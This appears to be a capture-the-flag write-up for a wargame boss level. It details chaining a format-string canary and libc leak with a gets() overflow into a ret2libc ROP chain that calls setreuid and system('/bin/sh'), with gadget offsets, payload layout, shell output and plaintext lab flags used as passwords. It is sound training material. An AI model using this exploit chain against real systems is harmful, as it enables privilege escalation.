# level10 — "Tessier-Ashpool" — Boss Fight — Format-String Canary+Libc Leak → `gets()` Overflow → ret2libc

## Concept

`./tessier`, SUID owned by `flag10`, home dir `/home/level10/`. The
mandatory boss fight. Per the subject, this level runs with every
mitigation enabled at once (non-executable stack, stack canaries, ASLR)
and is described as requiring "chaining a leak, a canary bypass, and a
libc-relative ROP chain — no single primitive breaks it." In practice,
this VM's actual configuration means the fight is a direct combination
of exactly the techniques already built up over levels 06–09, rather
than a wholly new category of bug — but it's the first level to
explicitly require combining a libc leak with a canary leak in one
exploit, which none of the earlier canary levels strictly needed (their
libc base was always assumed fixed without separately confirming it via
a leak).

## Recon

Login: `ssh level10@127.0.0.1 -p 4244`, password = level09's flag
(`kl9th7ox72218n3jlf554eymtlaynogo`).

No source. `nm ./tessier`: `init_vault`, `init_sessions`, `print_banner`,
`format_log`, `authenticate`, `create_session`, called from `main` (and
`authenticate` calls `create_session`). `checksec`: Partial RELRO,
canary found, NX enabled, no PIE. `getent passwd flag10` → uid 1027.

Disassembling the key functions:

- `format_log()`: `fgets(buf, 0x20, stdin)` into a 48-byte buffer
  (bounded, safe), then `printf(buf)` directly — the same format-string
  leak pattern used for the canary since level06, and (per below) also
  usable here to confirm the libc base live.
- `authenticate()`: unbounded `gets(buf)` into an 80-byte buffer
  (`sub $0x60,%rsp`, buf at `rbp-0x50`) — offset to the canary at
  `rbp-0x8` is `0x50 - 0x8 = 72` bytes.

## Retrieving the addresses, command by command

The subject explicitly lists ASLR as one of level10's mitigations, so
this was checked directly rather than assumed away. `randomize_va_space`
was already known to be `0` VM-wide (found during level04's recon), but
`ldd` alone doesn't prove what a SUID-executed binary actually sees, so
it was confirmed independently via a live leak: `format_log`'s
format-string bug was probed with `%N$p` specifiers for a libc pointer,
found at argument index 17, and it printed `0x7ffff7c2a1ca` consistently
across repeated runs — the same fixed libc base (`0x7ffff7c00000`) seen
on every earlier level. So `LIBC_BASE` is fixed, and every gadget offset
used below is computed against it, exactly as on levels 06–09.

The same `format_log` bug was then probed with `%N$p` for the stack
canary's `0x00`-low-byte signature. Argument index 11 reliably shows it
— stable within one run, changing between runs, as expected for a real
canary. Combined with the 72-byte offset from the `authenticate`
disassembly above, and the same libc gadget set reused from levels
03/06/07/09 (`pop rdi;ret`, `pop rsi;pop rbp;ret`, `setreuid`, an
alignment-fixup `ret`, `system`, `"/bin/sh"`), the exploit follows the
same two-stage interactive shape as those levels. The alignment-fixup
count that has worked most reliably across this series, `n_extra_ret =
1`, worked again here on the first run — `id` showed `uid=1027(flag10)`
immediately.

## Exploit

Two-stage interactive session (see `exploit.py`):

```
$ ./tessier
[T-A] Session tag: %11$p                    <- canary leak probe
[T-A] Tag accepted: 0xe4f4df33bea49b00      <- canary, parsed from this line
[T-A] Authentication token: <72 bytes junk><canary><8 junk><ROP chain>
```

ROP chain (offset 72 to canary, `authenticate`'s frame):
```
  72 bytes junk
  <leaked canary>
  8 bytes junk              (saved rbp, unused)
  pop rdi ; ret            (libc +0x10f78b)
  1027                     (flag10's real uid)
  pop rsi ; pop rbp ; ret  (libc +0x2b46b)
  1027
  0                        (junk, popped into rbp)
  setreuid                 (libc +0x1270d0)
  pop rdi ; ret
  BINSH                    (libc +0x1cb42f, "/bin/sh")
  ret                      (libc +0x2882f, ONE alignment fixup)
  system                   (libc +0x58750)
```

```
$ id
uid=1027(flag10) gid=1013(level10) groups=1013(level10),1001(levelgroup)
$ cat /home/flag10/.pass
6lhi9nnjkxeye0p1jh1qniao8e89f4mq
```

Verified: this string works as `bonus01`'s SSH password, exactly as the
subject describes ("the first bonus user's password is the last
mandatory flag").

